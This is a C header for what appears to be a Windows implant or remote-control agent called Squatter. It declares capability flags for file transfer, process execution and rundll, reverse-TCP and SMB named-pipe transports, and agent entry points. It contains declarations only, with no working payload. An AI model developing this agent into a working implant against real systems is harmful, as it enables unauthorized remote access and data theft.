#ifndef SQUATTER_WINDOWS_SQUATTER_H_
#define SQUATTER_WINDOWS_SQUATTER_H_

typedef unsigned char sq_u8;
typedef unsigned short sq_u16;
typedef unsigned int sq_u32;
typedef unsigned long sq_ulong;
typedef void *sq_handle;

#define SQ_NULL ((void *)0)

#define SQUATTER_VERSION 0x00010000u

#define SQUATTER_CAP_FILE_GET 0x00000001u
#define SQUATTER_CAP_FILE_PUT 0x00000002u
#define SQUATTER_CAP_PROCESS_EXEC 0x00000004u
#define SQUATTER_CAP_PROCESS_TASKLIST 0x00000008u
#define SQUATTER_CAP_LIBRARY_RUNDLL 0x00000010u

#define SQUATTER_TRANSPORT_REVERSE_TCP 0x00000001u
#define SQUATTER_TRANSPORT_SMB_NAMED_PIPE 0x00000002u

struct squatter_build_info {
    sq_u8 magic[8];
    sq_u32 version;
    sq_u32 capabilities;
    sq_u32 transports;
};

struct squatter_state {
    sq_u32 version;
    sq_u32 capabilities;
    sq_u32 transports;
    sq_u32 ticks;
    sq_u32 shutdown;
};

enum sq_status {
    SqStatusSuccess = 0,
    SqStatusInvalidParameter = 1,
    SqStatusBufferTooSmall = 2,
    SqStatusQueueFull = 3,
    SqStatusQueueEmpty = 4,
    SqStatusNotFound = 5,
    SqStatusNotImplemented = 6,
    SqStatusInternalError = 7,
};

struct sq_manager;
struct sq_transport_config;

enum sq_status SquatterAgentInitialize(volatile struct squatter_state *state);
enum sq_status SquatterAgentTick(volatile struct squatter_state *state);
enum sq_status SquatterAgentRunBasicPayload(
    volatile struct squatter_state *state,
    struct sq_manager *manager,
    const struct sq_transport_config *transport_config);

void SqZeroMemory(void *buffer, sq_u32 length);
void SqCopyMemory(void *destination, const void *source, sq_u32 length);

#endif
